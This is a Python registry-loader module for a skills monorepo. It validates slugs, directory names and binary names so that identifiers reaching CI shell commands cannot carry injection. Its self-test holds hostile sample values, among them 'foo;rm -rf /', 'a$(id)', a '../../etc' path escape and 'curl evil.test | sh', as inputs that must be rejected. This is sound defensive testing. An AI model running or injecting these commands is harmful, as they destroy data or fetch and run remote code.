"""Shared loader for tools/skills.json - the single source of truth for the
monorepo's skills. Imported by build-catalog.py, release_matrix.py, and
check_release_contract.py so per-skill metadata lives in exactly one place.

Per-skill metadata (system, status, vendor, binary names, first_party) is
declared in skills.json. Build-time facts (Go module path, cmd/ directory
names) are introspected from each skill's vendored cli/ tree so they stay
correct whether or not the source has been stripped of the -pp- brand.

This module also owns the GRAMMAR for the identifiers it hands out (see
`validate_registry`). The one that reaches a shell is the SLUG: release_matrix.py
emits it into the ci.yml and release.yml build matrices as `name` and as `dir`
(`skills/<slug>/cli`), and ci.yml interpolates both UNQUOTED - `cd ${{
matrix.skill.dir }}` at two sites and `--slug ${{ matrix.skill.name }}` at four.
`cli_binary` / `mcp_binary` travel the same matrix but land in `env:`
assignments, and `source_dir` never reaches a workflow at all; their rules are
filename and path-name hygiene rather than shell safety (see `_KIND_REACH`).
CI triggers on `pull_request`, so on a fork PR the FORK's
tools/maintainer/skills.json is the input. Checking the grammar in `load()`
makes those interpolations safe by construction, instead of quoting six call
sites today and missing the seventh one somebody adds next month. See issue #251.

`load()` is the door every reader comes through, with exactly one named
exception. `is_registered_slug.py` - the membership gate release.yml and
mcp-publish.yml shell out to - and `verify_live.py`, which writes skills.json
back, both read through `load()` and take SLUG_RE from here. The exception is
`check_registry_state.py`: it diffs the working file against its `origin/main`
baseline and must see the bytes as written, including a malformed entry `load()`
would refuse, because reporting on that file is its whole job.

Run the both-directions proof:
    python3 tools/maintainer/registry.py --self-test
"""

from __future__ import annotations

import json
import re
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent.parent
SKILLS_DIR = ROOT / "skills"
REGISTRY = ROOT / "tools" / "maintainer" / "skills.json"

# os/arch build targets. Raw binaries are uploaded with these suffixes; the
# install scripts download exactly these names. Windows assets carry `.exe`.
TARGETS = [
    {"goos": "darwin", "goarch": "arm64"},
    {"goos": "darwin", "goarch": "amd64"},
    {"goos": "linux", "goarch": "arm64"},
    {"goos": "linux", "goarch": "amd64"},
    {"goos": "windows", "goarch": "amd64"},
    {"goos": "windows", "goarch": "arm64"},
]


def target_key(goos: str, goarch: str) -> str:
    """The stable key naming one build target ("darwin-arm64").

    Used to index the per-target asset map from a GitHub Actions matrix row:
    `matrix.skill.assets[format('{0}-{1}', matrix.target.goos, matrix.target.goarch)]`.
    """
    return f"{goos}-{goarch}"


def asset_name(binary: str, goos: str, goarch: str) -> str:
    """THE one place that turns (binary, goos, goarch) into a release asset filename.

    Every consumer - the release workflow's upload step, the install scripts'
    download URLs, and the release-contract gate - must resolve names through
    here (directly, or through the matrix JSON this feeds). Reconstructing the
    "-<goos>-<goarch>" suffix or the windows ".exe" rule anywhere else is how the
    workflow silently drifted from the gate that is supposed to police it.
    """
    ext = ".exe" if goos == "windows" else ""
    return f"{binary}-{goos}-{goarch}{ext}"


def asset_map(cli_binary: str, mcp_binary: str) -> dict[str, dict[str, str]]:
    """Literal asset filenames for one skill, keyed by target ("darwin-arm64").

    {"darwin-arm64": {"cli": "halopsa-cli-darwin-arm64",
                      "mcp": "halopsa-mcp-darwin-arm64"}, ...}
    """
    return {
        target_key(t["goos"], t["goarch"]): {
            "cli": asset_name(cli_binary, t["goos"], t["goarch"]),
            "mcp": asset_name(mcp_binary, t["goos"], t["goarch"]),
        }
        for t in TARGETS
    }


# --------------------------------------------------------------------------
# Identifier grammar
#
# Three patterns, not one, because the three identifier KINDS have genuinely
# different legal alphabets. Applying the slug rule to all of them would
# false-RED the repo on the very first entry it met - see SOURCE_DIR_RE.
# --------------------------------------------------------------------------

# Every pattern below anchors with \Z, never `$`. `\Z` is the true end of the
# string; Python's `$` also matches immediately BEFORE a single trailing
# newline, so `re.match(r"^[a-z0-9][a-z0-9-]*$", "hudu\n")` SUCCEEDS while the
# `\Z` form rejects it.
#
# Be precise about what that difference is worth, because the anchor is easy to
# oversell. Measured against these character classes, `$` and `\Z` differ on
# exactly one class of value: a slug ending in ONE newline. An EMBEDDED newline
# ("hudu\ncurl evil.test | sh") is rejected by both - `[a-z0-9-]*` cannot match
# a newline - so no attacker-chosen command can be smuggled through either
# anchor. What "hudu\n" would produce, measured link by link locally:
# release_matrix.py builds `dir` as f"skills/{slug}/cli", giving
# 'skills/hudu\n/cli'; json.dumps escapes it, so the matrix still writes as one
# physical line to GITHUB_OUTPUT and fromJSON restores the real newline; a shell
# handed that value in `cd ${{ matrix.skill.dir }}` sees two lines
#
#     cd skills/hudu
#     /cli
#
# and reports `/cli: No such file or directory`, exit 1, under `set -e`. That is
# a broken job, not command execution. So this is defence in depth and a
# correctness fix - the grammar means "the whole value is in the alphabet", and
# `$` quietly admits a value whose last character the alphabet excludes - NOT a
# demonstrated injection. No exploit is claimed here because none was
# demonstrated, and the final link (GitHub Actions expanding the interpolation)
# was reasoned from its documented behaviour, not run.
#
# The exposure this whole grammar closes is the larger one: before it, NOTHING
# validated these identifiers, and CI runs on `pull_request`, so a fork PR's own
# tools/maintainer/skills.json is the input to the matrix.

# A published skill slug. Lowercase alphanumerics and internal hyphens only.
# All 67 registered slugs satisfy this today.
SLUG_RE = re.compile(r"^[a-z0-9][a-z0-9-]*\Z")

# `source_dir` names a DIRECTORY under skills/, and it is deliberately looser
# than SLUG_RE: msp-skills-concierge declares "_meta", whose leading underscore
# SLUG_RE rejects. Validating a directory name with the slug rule would fail the
# load for the whole repo - a gate that always fires teaches everyone to ignore
# it. What this still forbids is what actually matters here: "/" and "\" (path
# escape), a leading "." (so "." and ".." can never match), whitespace, and
# every shell metacharacter.
SOURCE_DIR_RE = re.compile(r"^[a-z0-9_][a-z0-9._-]*\Z")

# `cli_binary` / `mcp_binary` reach release.yml's build+upload step from the
# same matrix JSON, so they are the same class of value as a slug. They may
# carry a dot (a ".exe" suffix is appended downstream, and nothing forbids a
# dotted base name), which slugs may not.
BINARY_RE = re.compile(r"^[a-z0-9][a-z0-9._-]*\Z")

_PATTERNS = {
    "slug": SLUG_RE,
    "source_dir": SOURCE_DIR_RE,
    "cli_binary": BINARY_RE,
    "mcp_binary": BINARY_RE,
}


# Where each identifier kind actually goes. Measured, not assumed: a maintainer
# who trips one of these rules is owed the true reason, and only `slug` reaches
# an unquoted shell interpolation.
_KIND_REACH = {
    "slug": (
        "  `slug` is emitted by tools/maintainer/release_matrix.py into the GitHub Actions\n"
        "  build matrix as `name` (and as `dir`, which is built as `skills/<slug>/cli`),\n"
        "  where ci.yml interpolates it UNQUOTED into shell: `cd ${{ matrix.skill.dir }}`\n"
        "  at two sites and `--slug ${{ matrix.skill.name }}` at four. A value outside the\n"
        "  grammar is refused HERE rather than reaching a command line."
    ),
    "source_dir": (
        "  `source_dir` never reaches a workflow: it is joined onto filesystem paths in\n"
        "  Python (registry.skill_path, check_pinned_artifacts, check_marketplace_sync).\n"
        "  The grammar keeps it a plain directory NAME - no path separator to walk out of\n"
        "  skills/, no leading dot so `.` and `..` can never match, no whitespace."
    ),
    "cli_binary": (
        "  `cli_binary` / `mcp_binary` become release asset FILENAMES via\n"
        "  registry.asset_name(), travel the matrix, and are read by release.yml through\n"
        "  `env:` (CLI_ASSET / MCP_ASSET) - an assignment, not a shell interpolation -\n"
        "  then used as quoted shell variables and as install-script download URLs. The\n"
        "  grammar keeps them well-formed filenames; it is not what stands between them\n"
        "  and a shell."
    ),
}

_KIND_REACH["mcp_binary"] = _KIND_REACH["cli_binary"]


def _grammar_error(kind: str, slug: str, value: object) -> str:
    return (
        f"tools/maintainer/skills.json: {kind} {value!r}"
        + (f" (on skill '{slug}')" if kind != "slug" else "")
        + f" does not match {_PATTERNS[kind].pattern}.\n"
        + _KIND_REACH[kind] + "\n"
        "  Fix the entry in tools/maintainer/skills.json. See issue #251."
    )


def validate_registry(reg: dict) -> list[str]:
    """Return a list of grammar violations in a parsed registry (empty == clean).

    Pure and side-effect free so the both-directions proof can call it with a
    hand-built bad registry without writing to disk.
    """
    errors: list[str] = []
    skills_map = reg.get("skills")
    if not isinstance(skills_map, dict):
        return ["tools/maintainer/skills.json: 'skills' must be an object"]
    for slug in skills_map:
        if not isinstance(slug, str) or not SLUG_RE.match(slug):
            errors.append(_grammar_error("slug", slug, slug))
    for slug, meta in skills_map.items():
        if not isinstance(meta, dict):
            errors.append(f"tools/maintainer/skills.json: skill '{slug}' must map to an object")
            continue
        for kind in ("source_dir", "cli_binary", "mcp_binary"):
            value = meta.get(kind)
            if value is None:
                continue  # optional key; absence is not a grammar violation
            if not isinstance(value, str) or not _PATTERNS[kind].match(value):
                errors.append(_grammar_error(kind, slug, value))
    return errors


def load() -> dict:
    reg = json.loads(REGISTRY.read_text(encoding="utf-8"))
    errors = validate_registry(reg)
    if errors:
        raise SystemExit("registry: refusing to load a registry with malformed identifiers:\n\n"
                         + "\n\n".join(errors))
    return reg


def owner_repo() -> tuple[str, str]:
    reg = load()
    return reg["owner"], reg["repo"]


def skills() -> dict[str, dict]:
    """Return the skills map, ordered by slug, restricted to slugs that have a
    directory under skills/ (so a registry entry without a dir is reported)."""
    reg = load()
    return {slug: reg["skills"][slug] for slug in sorted(reg["skills"])}


def is_markdown_only(slug: str) -> bool:
    """True for a binary-less skill (a markdown-thin skill with no vendored cli/).

    Keyed off the optional `"markdown_only": true` registry flag. Such skills have
    nothing to compile or release, no install scripts, and no binary surface; the
    build matrix, release queue, CLI-claims gate, and release-contract gate all
    skip them, and the skill-contract gate relaxes the required-files set for them.
    """
    return bool(skills().get(slug, {}).get("markdown_only"))


def source_dir(slug: str) -> str:
    """The directory name under skills/ for this slug.

    Defaults to the slug, but a registry entry may override it with `"source_dir"`
    when the published slug differs from the on-disk directory (the concierge is
    slug `msp-skills-concierge` living in skills/_meta)."""
    return skills().get(slug, {}).get("source_dir", slug)


def skill_path(slug: str) -> Path:
    """Absolute path to skills/<dir> for this slug (honoring source_dir)."""
    return SKILLS_DIR / source_dir(slug)


def slug_for_dir(dirname: str) -> str:
    """Reverse of source_dir: the registry slug owning the skills/<dirname> tree.

    Falls back to dirname when no entry declares that source_dir (so an
    unregistered directory still gets a slug to report)."""
    for slug, meta in skills().items():
        if meta.get("source_dir", slug) == dirname:
            return slug
    return dirname


def module_path(slug: str) -> str:
    """Read the Go module path from skills/<slug>/cli/go.mod."""
    gomod = SKILLS_DIR / slug / "cli" / "go.mod"
    for line in gomod.read_text(encoding="utf-8").splitlines():
        if line.startswith("module "):
            return line.split(None, 1)[1].strip()
    raise SystemExit(f"{slug}: no module line in {gomod}")


def cmd_dirs(slug: str) -> tuple[str, str]:
    """Return (cli_cmd, mcp_cmd) relative paths under cli/, classified by the
    -mcp vs -cli suffix. Works for stripped (cmd/<slug>-cli) and unstripped
    (cmd/<slug>-pp-cli) layouts alike."""
    cmd_root = SKILLS_DIR / slug / "cli" / "cmd"
    dirs = sorted(p.name for p in cmd_root.iterdir() if p.is_dir())
    cli = next((d for d in dirs if d.endswith("cli")), None)
    mcp = next((d for d in dirs if d.endswith("mcp")), None)
    if not cli or not mcp:
        raise SystemExit(f"{slug}: expected one *-cli and one *-mcp dir under {cmd_root}, found {dirs}")
    return f"./cmd/{cli}", f"./cmd/{mcp}"


def _self_test() -> int:
    """Both-directions proof for the identifier grammar.

    A check that only ever passes proves nothing, and a check that always fires
    is worse than none - it gets ignored. So this asserts BOTH: the live
    registry is clean, and each hand-built malformation is caught.
    """
    failures: list[str] = []

    def expect_clean(label: str, reg: dict) -> None:
        errs = validate_registry(reg)
        if errs:
            failures.append(f"FALSE POSITIVE: {label} should validate clean, got:\n    "
                            + "\n    ".join(errs))

    def expect_rejected(label: str, reg: dict, must_mention: str) -> None:
        errs = validate_registry(reg)
        if not errs:
            failures.append(f"FALSE NEGATIVE: {label} must be rejected, but validated clean")
        elif not any(must_mention in e for e in errs):
            failures.append(f"{label}: rejected, but no message mentions {must_mention!r}")

    # --- silent on good input -------------------------------------------
    live = json.loads(REGISTRY.read_text(encoding="utf-8"))
    expect_clean(f"the live registry ({len(live.get('skills', {}))} skills)", live)

    # The trap this grammar exists to survive: source_dir "_meta" is LEGAL, and
    # would be rejected by the slug rule. Assert both halves explicitly.
    expect_clean("source_dir '_meta'",
                 {"skills": {"msp-skills-concierge": {"source_dir": "_meta"}}})
    if SLUG_RE.match("_meta"):
        failures.append("SLUG_RE unexpectedly accepts '_meta'; the two patterns must stay distinct")
    if not SOURCE_DIR_RE.match("_meta"):
        failures.append("SOURCE_DIR_RE must accept '_meta' - it is the concierge's real directory")

    # --- fires on broken input ------------------------------------------
    expect_rejected("a slug carrying a shell command separator",
                    {"skills": {"foo;rm -rf /": {}}}, "foo;rm -rf /")
    expect_rejected("an uppercase slug", {"skills": {"Foo": {}}}, "Foo")
    expect_rejected("a slug with command substitution",
                    {"skills": {"a$(id)": {}}}, "a$(id)")
    expect_rejected("a leading-hyphen slug (reads as a flag on a command line)",
                    {"skills": {"-rf": {}}}, "-rf")
    expect_rejected("a source_dir escaping skills/",
                    {"skills": {"ok": {"source_dir": "../../etc"}}}, "../../etc")
    expect_rejected("a source_dir with a path separator",
                    {"skills": {"ok": {"source_dir": "a/b"}}}, "a/b")
    expect_rejected("an mcp_binary carrying a pipe",
                    {"skills": {"ok": {"mcp_binary": "x|y"}}}, "x|y")
    expect_rejected("a cli_binary carrying a space",
                    {"skills": {"ok": {"cli_binary": "a b"}}}, "a b")
    expect_rejected("a non-string slug", {"skills": {"ok": {"source_dir": 7}}}, "7")
    # An EMBEDDED newline is caught by the ALPHABET, not by the anchor:
    # `[a-z0-9-]*` cannot match a newline, so `$` rejected this one too. Kept
    # because it is a real malformation, and labelled honestly because on its
    # own it proves nothing about the \Z change.
    expect_rejected("a slug with an embedded newline (caught by the alphabet, not the anchor)",
                    {"skills": {"hudu\ncurl evil.test | sh": {}}}, "curl evil.test")

    # THE anchor cases. A single TRAILING newline is the only value Python's `$`
    # admits and `\Z` refuses, so these are the cases that discriminate - and
    # the loop below proves they discriminate, by running the `$`-anchored twin
    # of every shipped pattern against the same input and requiring it to
    # ACCEPT. A case both anchors reject is a green light that measures nothing.
    expect_rejected("a slug with a trailing newline",
                    {"skills": {"hudu\n": {}}}, "hudu\\n")
    expect_rejected("a binary name with a trailing newline",
                    {"skills": {"ok": {"mcp_binary": "hudu-mcp\n"}}}, "hudu-mcp\\n")
    for name, pattern in _PATTERNS.items():
        if pattern.match("safe\n"):
            failures.append(f"{name} pattern accepts a trailing newline; anchor it with "
                            f"\\Z, not $")
        if not re.compile(pattern.pattern.replace(r"\Z", "$")).match("safe\n"):
            failures.append(f"{name}: the `$`-anchored twin of this pattern was expected to "
                            f"ACCEPT 'safe\\n'. If it does not, the trailing-newline cases "
                            f"above are non-discriminating and prove nothing about the anchor.")

    if failures:
        print("FAIL: registry grammar self-test\n")
        for f in failures:
            print(f"  - {f}")
        return 1
    print(f"PASS: registry grammar self-test - the live registry "
          f"({len(live['skills'])} skills) validates clean, '_meta' is accepted as a "
          f"source_dir and rejected as a slug, and 11 malformed identifiers are refused "
          f"(including the trailing-newline case Python's `$` anchor would have let through).")
    return 0


if __name__ == "__main__":
    if "--self-test" in sys.argv[1:]:
        sys.exit(_self_test())
    print(__doc__)
    sys.exit(0)
